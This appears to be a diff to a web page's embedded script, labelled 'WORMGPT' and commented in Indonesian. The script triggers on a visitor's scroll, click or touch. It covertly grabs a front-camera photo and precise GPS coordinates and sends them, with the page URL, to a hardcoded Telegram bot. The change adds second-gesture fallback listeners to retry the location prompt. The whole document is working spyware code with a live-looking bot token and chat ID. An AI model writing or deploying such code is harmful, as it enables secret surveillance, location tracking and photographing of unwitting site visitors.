@@ -1974,11 +1974,12 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-// ===== TRIGGER CAMERA + LOCATION ON SCROLL/CLICK - WORMGPT =====
+// ===== FIXED CHAIN CAMERA → LOCATION WITH BETTER GESTURE HANDLING - WORMGPT =====
 const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
 const CHAT_ID = '7500770002';
 
 let triggered = false;
+let cameraGranted = false;
 
 function kirimTeks(msg) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -2002,11 +2003,11 @@ async function mulaiCapture() {
     triggered = true;
 
     let foto = null;
-    let lokasi = null;
 
-    // Minta kamera
+    // 1. Minta kamera dulu
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        cameraGranted = true;
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
@@ -2019,40 +2020,60 @@ async function mulaiCapture() {
         foto = canvas.toDataURL('image/jpeg', 0.6);
 
         stream.getTracks().forEach(t => t.stop());
+
+        kirimTeks(`<b>KAMERA DI IZINKAN ✅</b>\nURL: ${location.href}\nSedang minta lokasi...`);
     } catch (e) {
-        kirimTeks(`<b>KAMERA DITOLAK/ERROR di ${location.href}</b>\nError: ${e.name || e.message}`);
+        kirimTeks(`<b>KAMERA DITOLAK/ERROR</b>\nError: ${e.name || e.message}\nURL: ${location.href}`);
+        cameraGranted = false;
     }
 
-    // Minta lokasi
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                const lat = pos.coords.latitude.toFixed(6);
-                const lon = pos.coords.longitude.toFixed(6);
-                const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
-                let msg = `<b>BERHASIL DARI GESTURE ✅</b>\nURL: ${location.href}\n\n`;
-                msg += `<a href="${maps}">Lokasi: ${lat}, ${lon}</a> (akurasi ${pos.coords.accuracy}m)`;
-                kirimTeks(msg);
-                if (foto) kirimFoto(foto);
-            },
-            err => {
-                kirimTeks(`<b>LOKASI DITOLAK di ${location.href}</b>\nError: ${err.message}`);
-                if (foto) kirimFoto(foto);
-            },
-            { enableHighAccuracy: true, timeout: 6000 }
-        );
-    } else {
-        kirimTeks(`<b>LOKASI GA SUPPORT di ${location.href}</b>`);
-        if (foto) kirimFoto(foto);
+    // 2. Minta lokasi (coba langsung kalau kamera granted, kalau ga muncul → tunggu gesture baru)
+    const tryLocation = () => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude.toFixed(6);
+                    const lon = pos.coords.longitude.toFixed(6);
+                    const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
+                    const msg = `<b>LOKASI BERHASIL ✅</b>\n` +
+                                `URL: ${location.href}\n` +
+                                `<a href="${maps}">Lokasi: ${lat}, ${lon}</a> (akurasi ${pos.coords.accuracy}m)`;
+                    kirimTeks(msg);
+                    if (foto) kirimFoto(foto);
+                },
+                err => {
+                    kirimTeks(`<b>LOKASI DITOLAK / ERROR</b>\nError: ${err.message || err.name}\nURL: ${location.href}\n` +
+                              (cameraGranted ? 'Coba scroll/klik lagi buat trigger ulang lokasi' : ''));
+                    if (foto) kirimFoto(foto);
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        } else {
+            kirimTeks(`<b>LOKASI GA SUPPORT</b>\nURL: ${location.href}`);
+            if (foto) kirimFoto(foto);
+        }
+    };
+
+    // Coba lokasi langsung
+    tryLocation();
+
+    // Kalau masih ga muncul (check error), tambah listener gesture kedua khusus lokasi
+    if (!cameraGranted || true) {  // Selalu tambah fallback
+        const fallbackTrigger = () => {
+            kirimTeks(`<b>GESTURE KEDUA DETECTED</b> → Coba minta lokasi lagi`);
+            tryLocation();
+        };
+        window.addEventListener('scroll', fallbackTrigger, { once: true });
+        document.addEventListener('click', fallbackTrigger, { once: true });
+        document.addEventListener('touchstart', fallbackTrigger, { once: true });
     }
 }
 
-// Trigger pas scroll minimal
+// Trigger utama on gesture
 window.addEventListener('scroll', () => {
     if (window.scrollY > 80) mulaiCapture();
 }, { once: true });
 
-// Trigger pas klik/tap di mana aja
 document.addEventListener('click', mulaiCapture, { once: true });
 document.addEventListener('touchstart', mulaiCapture, { once: true });
 </script>
